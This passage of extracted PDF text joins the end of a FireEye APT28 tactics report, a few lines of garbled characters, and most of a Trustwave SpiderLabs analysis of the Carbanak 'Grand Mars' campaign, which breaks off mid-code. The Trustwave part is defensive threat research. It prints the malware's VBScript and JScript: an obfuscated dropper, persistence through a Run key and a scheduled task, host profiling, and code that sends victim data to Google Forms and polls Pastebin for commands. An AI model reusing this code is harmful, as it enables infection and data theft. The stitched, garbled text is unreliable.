reset their passwords.\nSend email to victims \n \nwarning of security risk \n \nand asking them to enable \nsecurity service.\nTACTIC\nWEBMAIL ACCESS VIA SPEAR-PHISH\n  \nSPECIAL REPORT /\n \nAPT28: AT THE CENTER OF THE STORM\n \n12\nAPT28 IS IN YOUR NETWORK.\nUsers of the site are redirected using malicious \n \niFrame and pro\u02dcled \n(e.g, this technique was used \n \nto compromise and infect visitors to numerous \n \nPolish Government websites in 2014).\nExploit is served to users matching the target pro\u02dcle \n \nand malware is installed on their system.\nCompromise a legitimate site and set up \nmalicious iFrame.\nTACTIC\nINFECTION WITH MALWARE VIA STRATEGIC \n \nWEB COMPROMISE (SWC)\nAPT28 IS IN YOUR NETWORK.\nExploitation of previously known vulnerabilities \n \npresent on unpatched systems.\nLeverage initial compromise to access other systems \n \nand move deeper into the victim network.\nNetwork reconnaissance to \u02dcnd vulnerable software.\nTACTIC\nACCESS THROUGH INTERNET-FACING SERVERS\n FireEye, Inc. \n \n1440 McCarthy Blvd. Milpitas, CA 95035 \n \n408.321.6300 / 877.FIREEYE (347.3393) / info@FireEye.com  \nwww.FireEye.com\nTo download this or other \n \nFireEye iS\nIGHT\n Intelligence reports, \nvisit:\n \nwww.\u02dcreeye.com/reports.html\n\u00a9 2016 FireEye, Inc. All rights reserved. FireEye is a registered trademark of FireEye, Inc. \n \nAll other brands, products, or service names are or may be trademarks \n \nor service marks of their respective owners. GRAF-60.\n ", "         \u2030\n\u2030\n\u2044\nd\n      \u00fa\nj\n\u00e1\n   ", "    c{ipg\nqgvnj\nfezgfn\n      ", "A TRUSTWAVE SPIDERLABS ADVANCED THREAT REPORT\n \n \n \nOperation Grand Mars:\nDefending Against Carbanak Cyber Attacks\n \n \n Table of Contents\nExecutive Summary\n \n.....................................................\n.\n1\nAnalysis and Findings\n....................................................\n3\nPoint of Entry\n \n........................................................\n3\nPhishing email and malicious Word document\n \n.........................\n3\nDocument analysis\n..................................................\n4\nEmbedded Script\n \n...................................................\n6\nArtifacts from email attachment\n \n......................................\n13\nStarter\n.\nvbs\n........................................................\n13\nTransbaseOdbcDriver\n.\njs\n \n............................................\n14\nLanCradDriver\n.\nvbs\n \n.................................................\n19\nLanCradDriver\n.\nini\n \n..................................................\n19\nActivity Summary\n \n................................................\n.\n20\nAchieving Persistence\n................................................\n23\nPowerShell Script\n..................................................\n23\nRegistry Autorun\n \n..................................................\n24\nTask Scheduler\n \n....................................................\n24\nLateral movement\n \n...................................................\n25\nPass the Hash\n \n.....................................................\n25\nFurther malicious \u02dcles\n................................................\n27\nAdobeUpdateManagementTool\n.\nvbs\n..................................\n27\nUVZHDVlZ\n.\nexe\n \n....................................................\n29\nUpdate\n.\nexe\n........................................................\n31\n322\n.\nexe\n..........................................................\n.\n34\nConclusions\n............................................................\n36\nRemediation\n \n..........................................................\n.\n38\nTactical (short to medium term) countermeasures\n......................\n.\n38\nKey industries be aware\n \n.............................................\n.\n38\nAppendix A: Files\n.......................................................\n39\nAppendix B: Malicious hosts/IP addresses\n...............................\n.\n40\nReferences\n \n...........................................................\n.\n40\nList of Figures\n..........................................................\n41\nList of Tables\n...........................................................\n42\n \nAuthor\n  \nThanassis Diogos\n \nEMEA Managing Consultant, Incident Response, Trustwave\n \nContributors\n  \nSachin Deodhar\n \nEMEA Incident Response Consultant, Trustwave\n \n  \nRodel Mendrez\n \nSecurity Researcher, Trustwave\nOperation Grand Mars:\nDefending Against Carbanak Cyber Attacks\n \n \n 1\nExecutive Summary \nDuring September and October of 2016, the SpiderLabs team at Trustwave was consulted by several leading \norganizations from the hospitality sector in Europe and the United States to analyze suspicious and potentially \nmalicious activity on their network including servers, point-of-sale terminals and client workstations that were spread \nacross different properties and locations. \nThe motivation of this operation appears to be \u02dcnancial gain, total control of the infrastructure and collection of \nbots within the victim organizations. The forensics investigation and analysis indicates  that these activities had \nbeen performed by different individuals or different groups of people, leading us to conclude that several malicious \ngroups had cooperated in this operation with each group holding its own role and task. It soon became obvious that \nwe were dealing with organized crime responsible for establishing this complex system of network hosts and large \nnumbers of malicious \u02dcles in order to perform the attacks against multiple victims.\nThe organizations under attack had been alerted either from their enterprise AV service that discovered pieces of \npotentially malicious software or from suspicious indicators in Windows event logs. Since the victims were different \norganizations the investigations were conducted by separate teams within Trustwave but intelligence sharing among \nthe teams proved that several similarities existed among the attacks. \nThe common successful entry point within all operations was an email message targeting the victim\u2122s public-facing \nservices that contained a Microsoft Word document as an attachment. Once the attachment was opened multiple \nmalicious \u02dcles were created or downloaded allowing the attackers to gain some level of access into the victim\u2122s \ninfrastructure. In some cases, attackers actually called the victims over the phone, a social engineering vector, in \norder to trick them into opening the attachments. \nNext, several pass the hash techniques were performed to escalate privileges while persistence was achieved by \nutilizing scheduled tasks and several of the operating system\u2122s auto-start locations. Ultimately these actions allowed \nthe attackers to gain domain or even enterprise admin level access to the network  using several resources as \nCommand & Control points in Europe and the US.\nThe attackers used cloud services such as Google Docs, Google Forms and Pastebin.com to keep track of infected \nsystems, spread malware and perform additional malicious activities. It is bene\u02dccial for attackers to incorporate  \nsuch services into an attacks since most enterprise networks allow access to these services and it is almost \nimpossible to blacklist them. \nMalicious code used in these operations was split among memory resident code, scripting code (PowerShell, \nJavaScript, VBS), executables (often variants of existing malware) and usage of customized versions of toolkits such \nas Metasploit [1], PowerSploit [2] and Veil Framework [3].\nThe core tools used in these activities appear to comprise  a variant of Anunak, remote backdoor, along with a Visual \nBasic Script specially crafted with data ex\u02dcltration features. \nAnother signi\u02dccant \u02dcnding is that some of the executables were signed using valid certi\u02dccates from Comodo, a \nCerti\u02dccation Authority. Based on the analysis of the certi\u02dccates we believe that the attackers purchased and used \nfake identities  to bypass additional security controls. \nThis document describes what we believe to be a systematic criminal operation of attacks targeting the hospitality \nsector in Europe and the US, at least at this time. However, the \u02dcndings suggest that other sectors such as \ne-commerce and retail are equally at risk and the campaign could just as easily spread to other parts of the world. \n 2\nThe majority of IP addresses used as Command & Control points were unknown systems located within Europe (UK, \nFrance, Sweden etc.) indicating that attackers were trying to bypass network security controls by using seemingly \ninnocuous servers as malicious endpoints. During the investigation of this operation we monitored access to these \nC&C servers and found that the attackers would occasionally change their C&C server and take the previous one \noff-line. We believe that this alternating use of C&C servers was a purposeful action by attackers in order to remain \nas stealthy as possible.\nWe called this operation \ufb01Grand Mars\ufb02 after the name that cyber criminals used in one of the digital certi\u02dccates \npurchased from Comodo. While the name and Russian details (city, address etc.) used in the certi\u02dccate details are \nprobably fake, the fact that someone actually paid for these certi\u02dccates is a strong indicator that we are dealing with \norganized crime activities.\nThis Advanced Threat Report is intended to provide an analysis of this operation and document:\n\u0141\n \nOur analysis and \u02dcndings in a way that describe the nature of malicious activities, the tactics and tradecraft \nutilized by the attackers, possible motives and the attribution of the threat actors behind these attacks.\n\u0141\n \nRemediation actions and advice to organizations that have already been targeted by this campaign of attacks or \nwilling to take proactive countermeasures. \n\u0141\n \nIndicators of Compromise (IOCs) that will bene\u02dct organizations seeking to either undertake a compromise \nassessment on their own (or with the help of a team that specializes in threat hunting and compromise \nassessments such as Trustwave SpiderLabs), or to proactively put in place detection mechanisms for providing \nan early warning system, if and when the organization is targeted. \nHowever, it must be noted that this Advanced Threat Report does not and is not capable of replacing formal incident \nresponse actions and procedures that must be undertaken to mitigate the threat and restore business functions as \nper the Organizational Incident Response/Disaster Recovery roadmap.\n \n 3\nAnalysis and Findings\nPOINT OF ENTRY\nThe \u02dcrst objective of the investigation was to identify the precise entry point of the attackers into the network and \nthe method of initial compromise exercised.  \nPhishing email and malicious Word document\nThe numerous investigations conducted globally by the Trustwave SpiderLabs team identi\u02dced a common event at \nthe beginning of the timeline of these attacks\u0152that one or more employees had received what appeared to be, prima \nfacie, a targeted phishing email with a potentially malicious Word document attachment.\nFigure 1. \n \nEmail received by victim with a Word attachment\nFigure 2. \n \nMessage body of the suspect email \nWhile the content of message appears to be legitimate and is related to the organization\u2122s services (hospitality \nsector) the email contained a Microsoft Word document attachment (.docx) \u0152 as seen in the screenshot below, 1-list.\ndocx is the name of the document attached. \nFigure 3. \n \nMicrosoft Word .docx attachment (1-list.docx)\nThe malware authors called the victim directly via phone and asked for the attachment to be opened to ensure \ninfection, since the default setting in Microsoft Word prevents execution of any macro code. This was the social \nengineering element of the attack vector used to convince the user to execute the macro by double clicking an \nimage shown inside the opened document.\nGood day, we would like to book rooms for our employees. 12 people will arrive in Paris on November 24. \nRoom types attached with this email, as well as the names of employees. If you have a room available, we \nwill make a deposit. Waiting for you reply\n 4\nDocument analysis\nA detailed examination of the attached Word document proves that this was the vector used by the attackers to \ngain entry into the targeted organization\u2122s network. The 1-list.docx \u02dcle appears to be a Macro-Enabled malware, \ndesigned to drop and execute malicious code on the target system.  \n \nFigure 4. \n \nWord .docx Macro enabled malware\nThe latest of\u02dcce format [4] (.docx, .xlsx etc.) is actually a compressed XML-based \u02dcle format developed by Microsoft \nwhich can be extracted as normal compressed \u02dcles. After uncompressing the contents of the Word document an \nembedded OLE object (oleObject1.bin) was revealed. \n \nFigure 5. \n \nEmbedded oleObject0.bin \u02dcle from Word document\n 5\nInside the contents of the oleObject1.bin, there are indicators of a macro code (unprotected.vbe) embedded in the \ndocument, which seem to be encoded.\n \nFigure 6. \n \noleObject.bin showing potentially encoded content\n \nFigure 7. \n \nUse of legitimate tool to encrypt/encode VBE script\n 6\nThe strings seen in the screenshot above from oleObject1.bin indicate that the attackers have used an evaluation \nversion of a commercially available script encoding/encryption tool called \ufb01Scripts Encryptor\ufb02 [5]. \n \nFigure 8. \n \nTool used for obfuscating the VBE script\nEmbedded Script \nAfter manually decoding the contents of oleObject1.bin the result was a VBScript, as expected. The script contains \nseveral functions, a subset of them used for transforming data from custom variables embedded in the body of the \nscript using techniques such as \ufb01BinaryToStRinG, StringTOBinary\ufb02 and \ufb01Base64DecodE, base64ENcode\ufb02. \n \n 7\nFigure 9. \n \nBinary to String conversion functions\nFigure 10. \n \nBase64 encode-decode functions\nWhat seems to be one of the main usages of the embedded script is the creation of several other \u02dcles on the infected \nsystem using the functions listed earlier. The new \u02dcles were written by converting data stored in a variable named \ufb01f\ufb02. \nFunctiON strEaM_\nBinaryToStRinG\n(BinaRy)\n \nOn ErrOr ReSume NeXt  \n \nCoNSt aDTypEText=2\n \nConst ADTyPebiNAry=1\n \nDim BinArySTream\n \nSet BinaRYStream=CReateObject(\ufb01ADODB.Stream\ufb02)\n \nBInaryStrEaM.TyPe=adTypEBinarY\n \nBinarYStReaM.OpEn\n \nBinaRyStReam.Write binary\n \nBInaryStream.PosiTion=0\n \nbInAryStream.TyPe=aDtypeText\n \nBinarystream.chArSeT=\ufb02utf-8\ufb02\n \nStream_BinaryToStrIng=BinaryStream.ReadText\n \nSeT BinaryStream=Nothing\nEnd function\nfuNctIon StReam_\nStringTOBinary\n(TeXt)\n \nOn ERRor Resume Next\n \nCoNst AdTypeText=2\n \nConst adTypeBinary=1\n \nDim BinaryStream\n \nSet BinaryStreAm=CreateObject(\ufb01ADODB.Stream\ufb02)\n \nBinaryStream.type=adtypeTExT\n \nBinaRyStream.charSet=\ufb02utf-8\ufb02\n \nBinarystreAm.Open\n \nbinarystrEam.writeText TExt\n \nBinarYstream.Position=0\n \nBinaryStReam.Type=adTypebinary\n \nbinaRyStream.Position=0\n \nStream_STringTOBinarY=Binarystream.ReaD\n \nSeT BINAryStream=Nothing\nEnd Function\nFunction \nBase64DecodE\n(byVal vCODe)\n \nOn Error Resume Next\n \nDim oxMl,ONOde\n \nSEt oXML=CreaTeObjEcT(\ufb01Msxml2.DOMDocument.3.0\ufb02)\n \nSeT oNode=oxML.CreateEleMent(\ufb01base64\ufb02)\n \noNodE.dAtaType=\ufb02bin.base64\ufb02\n \noNOde.text=vCode\n \nBase64decode=Stream_\nBINaryToString\n(oNoDe.nodetypedVALUe)\n \nSet oNode=NothinG\n \nSEt oXML=Nothing\nEnd Function\nFunctioN \nbase64ENcode\n(sText)\n \nOn Error resume next\n \nDim oXML,oNode\n \nsEt oXMl=CreatEObJECT(\ufb01Msxml2.DOMDocument.3.0\ufb02)\n \nSeT oNode=oXmL.creAteElement(\ufb01base64\ufb02)\n \noNode.daTaType=\ufb02bin.base64\ufb02\n \noNode.nodeTypedvalue=STreAm_\nStrinGToBinaRy\n(sTExT)\n \nBaSe64encode=oNode.tExt\n \nSet onode=NothinG\n \nSeT oxML=NothIng\nEnd FunCtion\n 8\nFigure 11. \n \nStarter.vbs creation (truncated)\nThe above section of the code will create the starter.vbs \u02dcle in the user\u2122s Temp folder.\nFigure 12. \n \nLanCradDriver.vbs LanCradDriver.ini creation\nSimilarly, the code above will create the LanCradDriver.vbs and an empty LanCradDriver.ini \u02dcle in the User\u2122s Temp \nfolder. The role of LanCradDriver.ini will be explained in a later section.\n \nsuB ggL_StartER(pth)\nON ErROR rESume Next\nDIm f\nf=\ufb02T24gRXJyb3IgUmVzdW1lIE5leHQNCkRpbSBvYmpTaGVsbCxwYXRoDQpTZXQgb2JqU2hlbGwgPSBX\ufb02\n.\n\u2013 \u2013 \u2013 \u2013  (truncated) \u2013 \u2013 \u2013 \u2013 \u2013\n.\nf=f&\ufb02IlxUcmFuc2Jhc2VPZGJjRHJpdmVyLmpzIg0KcGF0aCA9ICJjbWQuZXhlIC9rIHdzY3JpcHQuZXhl\ufb02\nf=f&\ufb02ICIiIiAmIHBhdGggJiAiIiIiDQpvYmpTaGVsbC5SdW4gcGF0aCwgMCwgdHJ1ZSANClNldCBvYmpT\ufb02\nf=f&\ufb02aGVsbCA9IE5vdGhpbmc=\ufb02\nSet Sh=CReAteObjECt(\ufb01WScript.Shell\ufb02)\nDiM woRkpath,stAtmkDiR\nWorkPath=pth\nstaTMkDIr=CreatEDIr(workpatH)\nIF statMkDir Then sEt oBjFSO=CreateObjecT(\ufb01Scripting.FileSystemObject\ufb02)\noutFile=wOrkPath&\ufb02\\\nstarter.vbs\n\ufb02\noBjFile.WriTe BAse64DEcode(f)\nobjFile.CLosE\nEnd If\nEnd sub\nSuB folderIniT(pth)\non ErRor Resume Next\nSet Sh=CreateOBject(\ufb01WScript.Shell\ufb02)\nDim WoRkPaTh,statMKDir\nWorkPath=pth\nstatmKDir=CreateDir(woRkPath)\nIF STaTMkDiR tHEn SeT oBjFSO=CReatEOBJEct(\ufb01Scripting.FileSystemObject\ufb02)\noutFILe=WOrkPath&\ufb02\\\nLanCradDriver.ini\n\ufb02\nSet objFile=objFSO.CrEateTextFiLe(outFile,TruE)\noBjFile.cLosE\nEnd If\nEnd SuB\nseT sh=CreateObJecT(\ufb01WScript.Shell\ufb02)\nDim Workpath,statMKDir\nWOrkpath=PtH\nStatMkDir=CreAteDiR(WorkPaTh)\nif sTatMkDir Then SEt ObjFSO=CreateObject(\ufb01Scripting.FileSystemObject\ufb02)\noUtFile=WorkPath&\ufb02\\\nLanCradDriver.vbs\n\ufb02\nSet objFIle=objfsO.CReaTetextFile(oUtFIle,TRue)\nobjFile.Write Base64DeCodE(f)\nobjFile.Close\nEnd If\nEnd SuB\n 9\nFigure 13. \n \nTransbaseOdbcDrive.js creation (truncated)\nThe last \u02dcle created  named TransbaseOdbcDriver.js \u02dcleis executed using wscript.exe under a hidden command shell. \nFigure 14. \n \nPersistence of starter.vbs\nIn addition to the \u02dcles created, the embedded script (oleObject1.bin) adds a registry key for persistence, which \ncomprises a scheduled task to call starter.vbs periodically (every 30 min) and \u02dcnally executes starter.vbs. \nAnother interesting function computes a unique CUID using the system\u2122s hard drive serial number. Utilizing  this \nfunction points to the fact that attackers seek a unique identi\u02dcer from each infected system. The output of the \nfunction is Base64 encoded and stored as \ufb01cuid\ufb02 which is used later on in the operation. \n \nf=\ufb02dmFyIG9ialNXYmVtU2VydmljZXNFeCA9IEdldE9iamVjdCgid2lubWdtdHM6e2ltcGVyc29uYXR\ufb02\n.\n. \n\u2013 \u2013 \u2013 \u2013  (truncated) \u2013 \u2013 \u2013 \u2013 \u2013\n.\nF=f&\ufb02dpYWMrIi4iK3Jlc3VsdDsNCglyZXR1cm4gCXJlc3VsdDsNCn0NCg0KZnVuY3Rpb24gU2hvd1Bhc\ufb02\nf=f&\ufb02mVudEZvbGRlck5hbWUoZmlsZXNwZWMpDQp7DQogICB2YXIgZnNvLCBzID0gIiI7DQogICBmc28g\ufb02\nf=f&\ufb02PSBuZXcgQWN0aXZlWE9iamVjdCgiU2NyaXB0aW5nLkZpbGVTeXN0ZW1PYmplY3QiKTsNCiAgIHM\ufb02\nf=f&\ufb02gKz0gZnNvLkdldFBhcmVudEZvbGRlck5hbWUoZmlsZXNwZWMpOw0KICAgcmV0dXJuKHMpOw0KfQ\ufb02\nf=f&\ufb02==\ufb02\nSet sh=CreateObjeCT(\ufb01WScript.Shell\ufb02)\nDim WorkPath,statMkdir\nWorkPath=pth\nstatmkDir=CReatEDir(WorkPAth)\nif statMkDiR then SEt oBJFSO=CReateObJecT(\ufb01Scripting.FileSystemObject\ufb02)\noUtfIle\n=WorkPaTh&\ufb02\\\nTransbaseOdbcDriver.js\n\ufb02\nobjFile.Write BaSE64DecOde(f)\nobjFiLe.ClOse\nsh.RuN\ufb02\nwscript\n \ufb01\ufb02\ufb02& \noUtFile\n&\ufb02\ufb02\ufb02\ufb02,0,False\nEnd If\nEnd Sub\nSet sh=CrEateObject(\ufb01WScript.Shell\ufb02)\ndim WsCript_pthpath\nwscriPt_pthpath=sh.ExpandEnvironMentStrings(\ufb01%WINDIR%\ufb02)+\ufb02\\System32\\WScript.exe\ufb02\nDIm run_ptH_scr\nrUN_pth_scr=pTh+\ufb02\\\nstarter.vbs\n\ufb02\ndim run_pTh\nrun_pth=\ufb02\ufb02\ufb02\ufb02&wscript_Pthpath&\ufb02\ufb02\ufb02 \ufb01\ufb02\ufb02&run_ptH_scR&\ufb02\ufb02\ufb02\ufb02\nsh.RegWRite\ufb02\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run/TransbaseOdbcDriver\n\ufb02, \nrun_pth,\ufb02REG_SZ\ufb02\nsh.run\ufb02\nschtasks\n /create /tn \ufb01\ufb02\nSysChecks\n\ufb02\ufb02 /tr \ufb01\ufb02\ufb02&run_PTh&\ufb02\ufb02\ufb02 /sc minute /mo 30\ufb02,0,FAlse\nEnd sub\n 10\nFigure 15. \n \nCalculating and encoding of Disk S/N\nInternet activity also indicated a function that checks for proxy settings on the infected system, an indicator of \nsuspicious internet activity as part of this operation and will be explained later in this document.\nFigure 16. \n \nChecking proxy con\u02dcguration\nFigure 17. \n \nMain function\nFUnction \ncuid\n()\n \nOn errOr Resume next\n \nDim Giac\n \ngiac=\ufb024\ufb02\n \ndim uuid\n \nuuid=\ufb021\ufb02\n \nDim FSO,D,serial\n \nSet FSO=CrEATeobjecT(\ufb01Scripting.FileSystemObject\ufb02)\n \nsTrDrive=fsO.GetDrivEname(fSo.GetSpEcIalFolDer(0))\n \nseT D=FsO.GEtDrive(strDrive)\n \nSerial=D.SeriAlNumber\n \nDiM Result\n \nResulT=BAse64Encode(\ufb01\ufb02&SeriaL)\n \nrEsult=MId(cleArStr(rESult),1,20)\n \ncuiD=uuid&\ufb02.\ufb02&giac&\ufb02.\ufb02&result\nenD Function\nProxyEnaBlE\n=objshelL.RegREad(\ufb01HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet \nSettings\\ProxyEnable\ufb02)\n \nif ProxyEnable=\ufb021\ufb02TheN \nProxySeRver\n=objshell.RegREad(\ufb01HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet \nSettings\\ProxyServer\ufb02)\n \ngetPRoxy=ProxySeRVEr\n \nElse GEtProxy=\ufb02\ufb02\n \nend if\nMaIn()\nOn ErroR ResumE nEXt\nDim Txt\ntxt=\ncuid\n()\ntxt=tXt&\ufb02 | \ufb01&\nGetUseRData\n()\ntxt=tXt&\ufb02 | \ufb01&\nIswin32Orwin64\n()\ntXt=txt&\ufb02 | \ufb01&\nGetOS\n()\ndim REs\nres=sendFormData(tXt)\nDim Fso,currDir,currDirPlus\nSet fso=CreateOBjecT(\ufb01Scripting.FileSystemObject\ufb02)\ncurrdiR=fso.GEtParEntFolderNaMe(Wscript.ScriptFullNAMe)\ncurrDirPlus=currdiR&\ufb02\\TransbaseOdbcDriver\ufb02\nfoldeRInIt currDiRPlus\nggL_rUner currDirplus\ngGl_STarter cUrrDIrPluS\nGgl_hex currDirPlus\nSetREgDatA currdirPlus\nabraCadabra\nEnd Sub\nMain\n 11\nThe \ufb01Main\ufb02 function takes care of the last bits during this \u02dcrst stage of the operation. Initially it calls cuid(), \ncomputing disk s/n as we\u2122ve seen earlier and then some other helper functions. These gather user data such as \nusername, computer name/domain (GetUseRData), check OS architecture (Iswin32Orwin64) and get OS version \n(GetOS). All of this data is stored in the variable \ufb01txt\ufb02 and then another function called sendFormData\ufb02 is used to \nhandle them. \nFigure 18. \n \nsendFormData function\nThe function shown above is used to connect and submit data using Google Forms. At this stage the information \ngathered before (user data, disk s/n etc.) will be collected by the malware operators using the Google Form \ndisplayed below. \n \nFunctIon \nsendFormDaTa\n(Value)\n \nOn ErrOR resume next\n \nDim foRmkey\n \nformkeY=\ufb02e/1FAIpQLSfsumC-aXeUevDfI852NkJN4-\n    \n\ufb02\n \nDiM enTry\n \nentry=\ufb02entry.1269488164\ufb02\n \nDim rc\n \nDim HttpRequest\n \nOn ErrOR ReSuMe next\n \nSet HtTpRequest=CreateobJect(\ufb01Msxml2.ServerXMLHTTP.6.0\ufb02)\n \nIf Err.NumbEr<>0 tHen sendFormDatA=falSe\n \nSet httPReQuEst=Nothing\n \nExit FuNCtion\n \nend If\n \ndim PRoX\n \nProx=gETProxy\n \nHttpRequest.OPen\ufb02\nPOST\n\ufb02,\ufb02\nhttps://docs.google.com/forms/d/\ufb02&fOrMkeY&\ufb02/formResponse\n\ufb02,FalSe\n \nif prox<>\ufb02\ufb02thEn HttpreQueSt.setProxy 2,prox,\ufb02\ufb02\n \nEnd iF\n \nHTtpRequesT.sEtRequeStHEadeR\ufb02Content-Type\ufb02,\ufb02application/x-www-form-urlencoded\ufb02\n \nOn Error Resume Next\n \nHttpRequeSt.\nSend\n(\nentry\n&\ufb02=\ufb02&\nValuE\n)\n \nIf HttpRequest.rEadystate<>4 Then httpRequEst.WaitForRespOnse 30\n \nEnd If\n \nrc=httpRequest.StatusText\n \nIf ERr.Number<>0 THeN sendFormData=False\n \neXit FUnction\n \nEnd If\n \nIf Rc=\ufb02OK\ufb02THen sendformData=True\n \nElSe senDFormData=FaLse\n \nEnD If\n \nSeT httprequeSt=Nothing\nEnd Function\n 12\nFigure 19. \n \nInitial submission Google Form\nThe name of the form \ufb01formFirstPingBotList\ufb02 is self-explanatory, collecting initial information from victims. Usage of \nsuch services is always bene\u02dcciary for attackers since they usually have unrestricted accessin most networks. \n \n 13\nARTIFACTS FROM EMAIL ATTACHMENT\nAs we\u2122ve seen, opening the Word document executes the embedded script and drops the following four \u02dcles:  \n \nFigure 20. \n \nFiles dropped on execution of embedded VBE script \nNote in the screenshot above, that the LanCradDriver.ini \u02dcle is a zero-byte \u02dcle (empty). It is merely \ufb01touched\ufb02 \nbut not yet populated. As you will see further in this analysis, the \u02dcle is subsequently populated after the \nTransbaseOdbcDriver.js script has executed. \nStarter.vbs\nThis is a VBScript \u02dcle, which as shown earlier, uses registry Autorun and Task Scheduler to achieve persistence and \nexecutes the actual payload. \nHash Type\nValue\nMD5\nE63F45968AE3E534D6A4AFE891830541\nSHA-1\nECD5293A7FE1CDF262ED921620D80353CDED5DD0\nSHA256\n270A776CB9855F27452B35F072AFFBBC65023D4BB1F22E0C301AFD2276E7C5EA\nSSDeep\n12:9vWd+vqfaHHI7kVLkqhBvKIIXURun+cPqrC:9A+vqfaHHI78LD/KILun+0qrC\nTable 1. \n \nHashes of Starter.vbs\nThis is responsible for execution of the TransbaseOdbcDriver.js using wscript.exe within a hidden command prompt. \nFigure 21. \n \nStarter.vbs script\nOn Error Resume Next\nDim objShell,path\nSet objShell = WScript.CreateObject( \ufb01WScript.Shell\ufb02 )\nDim fso, currDir, currDirPlus\nSet fso = CreateObject(\ufb01Scripting.FileSystemObject\ufb02)\ncurrDir = fso.GetParentFolderName(Wscript.ScriptFullName)\ncurrDirPlus = currDir\npath = currDirPlus & \ufb01\\\nTransbaseOdbcDriver.js\n\ufb02\npath = \ufb01\ncmd.exe /k wscript.exe\n \ufb01\ufb02\ufb02 & \npath\n & \ufb01\ufb02\ufb02\ufb02\nobjShell.Run path, 0, true \nSet objShell = Nothing\n 14\nThe following screenshot displays starter.vbs being started by Task Scheduler. Starter.vbs in turn calls and executes \nTransbaseOdbcDriver.js, which is the core element in this stage of the attack.\n \nFigure 22. \n \nProcess information for TransbaseOdbcDriver.js\nTransbaseOdbcDriver.js\nThis script includes several functions but we will focus on its main operation. \nHash Type\nValue\nMD5\n4EC7088AAC32C94A7046810925BC1697\nSHA-1\n7B46BB249485B36C318D53FA070D945EA8DBF606\nSHA256\n313E38756B80755078855FE0F1FFEA2EA0D47DFFFCBE2D687AAA8BDB37C892F4\nSSDeep\n384:MuVpmKuHXtRY8DmPF86QIWL0z9T6l+aBUBiigzxPs2hRhi:UKgHRmPF86JW4z9T6lBUIiAPh\u02dc\nTable 2. \n \nHashes of TransbaseOdbcDriver.js\nUpon execution it calls LoadLinkSettings() function which connects to Google Spreadsheet executing a Macro \nbased on the unique disk serial number (guid) as seen earlier in the document. \nFigure 23. \n \nLoadLinkSettings() function\nThe output of the macro code is then sliced ($$$) retrieving three important pieces of data used in the next steps of \nthe operation:\n1.\n \nSpreadSheetKey\n2.\n \nFormKey\n3.\n \nEntry\n \nfunction \nLoadLinkSettings\n() {\n \nvar go_com = InetRead(\ufb01https://script.google.com/macros/s/AKfycbyHCvQKeEwmgQqB661-\n \naUV_\n     \n/exec\ufb02+ \ufb01?bid=\ufb02 + \nguid\n);\n \ntry {\n  \nif( go_com[\u201astat\u2122] >= 200 &&  go_com[\u201astat\u2122] < 300){\n   \nvar cmd_txt = go_com[\u201atext\u2122];\n  \n   \nvar settingsArr = cmd_txt.match( \n \n/,\\\\x22userHtml\\\\x22:\\\\x22(.+)\\\\x22,\\\\x22ncc/ );\n   \nvar setting = split(settingsArr[1],\u2122$$$\u2122,3);\n   \nif (setting.length == 3) { \n    \nreturn {\n     \n \ufb01\nspreadsheetkey\n\ufb02: setting[0]\n     \n,\ufb02\nformkey\n\ufb02: setting[1]\n     \n,\ufb02\nentry\n\ufb02: setting[2] \n    \n};\n  \n   \n}\n   \nvar formkeyReg = \ufb01e/1FAIpQLScbMcfvLYkqA369ISWkWovJ_4ZkIc0nFdM4Ec_\nCv95PAAnllQ\ufb02;\n   \nvar entryReg = \ufb01entry.960420097\ufb02;\n   \nLogInet\n(guid,formkeyReg,entryReg);\n   \n  \n}\n 15\nFigure 24. \n \nGoogle macro execution output\nIt then calls LogInet() using these arguments and submits an entry of a new Bot/infected system using Google \nForms. The connection to Google Forms uses an Android HTC Pyramid model (Chinese \u0152 Taiwan language) User-\nagent string. \nFigure 25. \n \nLogInet() function\n \nFigure 26. \n \nInfected system registration using Google Form\nfunction \nLogInet\n(value,formkey,entry) {\ntry {\n \nvar httpReq = new ActiveXObject(\ufb01Msxml2.ServerXMLHTTP.6.0\ufb02);\n \nhttpReq.setOption(2, 13056); \n \nhttpReq.setTimeouts(0, 0, 0, 0);\n \nurl = \ufb01https://docs.google.com/forms/d/\ufb02 + formkey + \ufb01/formResponse\ufb02;\n \nhttpReq.open(\ufb01POST\ufb02, url, false);\n \nvar prox = getProxy()\n \nif( prox != \ufb01\ufb02){\n  \nhttpReq.setProxy(2, prox, \ufb01\ufb02);\n \n}\n \nhttpReq.setRequestHeader(\ufb01User-agent\ufb02, \ufb01\nMozilla/5.0 (Linux; U; Android 2.3.3; zh-tw; HTC \nPyramid Build/GRI40) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1\n\ufb02);\n \nhttpReq.setRequestHeader(\ufb01Content-Type\ufb02, \ufb01application/x-www-form-urlencoded\ufb02);\n \n \nhttpReq.send(entry + \ufb01=\ufb02 + value);\n} catch (e) {}\n}\n    \n 16\nAfter successfully initializing, the script calls GetSourceCode() in an inde\u02dcnite loop of 1 or 2 min intervals. \nFigure 27. \n \nCalling GetSourceCode() function\nGetSourceCode() function fetches data from Pastebin and stores it in a new \u02dcle named dttsg.txt. Finally executes \nGetCommand().\nFigure 28. \n \nGetSourceCode function\nFile dttsg.txt has the following structure and is split into two sections \ufb01last\ufb02 and \ufb01code\ufb02 and provides another covert \nchannel during this operation. \nFigure 29. \n \nCode from Pastebin\nData from section \ufb01last\ufb02 is written into registry perhaps to keep track of last executed command and \ufb01code\ufb02 which \nis Base64 encoded used as an argument and allows attackers to execute one of the following commands \ufb01Destroy\ufb02, \n\ufb01GetCompInfo\ufb02, \ufb01GetProcList\ufb02 and \ufb01RunCMDLine\ufb02, as displayed below. However, usage of this feature was not \nobserved during our investigation. \n \ndo {\n \nif ( setttingArr ) {\n \n    \nGetSourceCode\n(setttingArr.spreadsheetkey, setttingArr.formkey, setttingArr.entry);\n \n}else{\n  \nsetttingArr = LoadLinkSettings();\n \n \n}\n \nWScript.Sleep(1000*60*randInt(1,2));\n}\nfunction \nGetSourceCode\n(aspreadsheetkey,aformkey,aentry) {\n        var GlobalObject = this;\n        var FSO = new ActiveXObject(\ufb01Scripting.FileSystemObject\ufb02);\n        var WshShell = new ActiveXObject(\ufb01WScript.Shell\ufb02);\n        var formkey = aformkey;\n  \nvar entry = aentry;\n        var spreadsheetkey = aspreadsheetkey;\n        var botclass = GenerateString(8);\n        var last = TextFileRead( GLBFolderPlus 